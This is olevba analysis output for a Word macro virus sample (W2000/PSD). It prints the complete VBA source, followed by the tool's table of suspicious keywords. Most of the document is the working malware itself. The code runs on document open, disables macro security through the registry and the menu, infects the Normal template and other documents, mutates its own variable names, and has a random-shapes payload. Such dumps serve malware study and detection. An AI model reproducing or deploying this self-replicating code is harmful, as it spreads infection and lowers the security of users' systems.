olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.a-da988adba0bae3edfe409298b9a224749b0f5326
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.a-da988adba0bae3edfe409298b9a224749b0f5326 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
' W97M/PSD by ALT-F11, VAMP Poly by VicodinES
' Converted to W2000/PSD by VicodinES
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
If Day(Now) = Minute(Now) Then
Randomize: For AU8168 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next AU8168: End If
FN565 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
BK156 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set QM2229 = ActiveDocument.VBProject.VBComponents.Item(1)
AA6244 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set QM2229 = NormalTemplate.VBProject.VBComponents.Item(1)
KN3130 = True
Call IO4572_UR6912
ActiveDocument.Saved = True
End If
If KN3130 <> True And AA6244 <> True Then GoTo RV7674
If KN3130 = True Then QM2229.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FN565 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If AA6244 = True Then QM2229.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, BK156 - 4))
RV7674:
If BK156 <> 0 And FN565 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function IO4572_UR6912()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "PK7673": r1(2) = "VR9691": r1(3) = "IB151": r1(4) = "MP6026": r1(5) = "UR6912": r1(6) = "FN565"
r1(7) = "BK156": r1(8) = "AA6244":: r1(9) = "QM2229": r1(10) = "KN3130": r1(11) = "RV7674": r1(12) = "IO4572": r1(13) = "KJ1676": r1(14) = "DI6148": r1(15) = "AU8168"
For AU8168 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call UR6912(a1, r1(AU8168))
Next AU8168
End Function
Private Function UR6912(DI6148, KJ1676 As String)
On Error Resume Next
Dim PK7673 As Long: Dim VR9691 As Long: Dim IB151 As Long: Dim MP6026 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
PK7673 = 1: VR9691 = 1: IB151 = .CountOfLines: MP6026 = Len(.Lines(.CountOfLines, 1))
Do While .Find(KJ1676, PK7673, VR9691, IB151, MP6026, True)
strline = .Lines(PK7673, 1)
strline = Left(strline, VR9691 - 1) & DI6148 & Mid(strline, MP6026)
.replaceline PK7673, strline
PK7673 = IB151 + 1: VR9691 = 1:
IB151 = .CountOfLines
MP6026 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

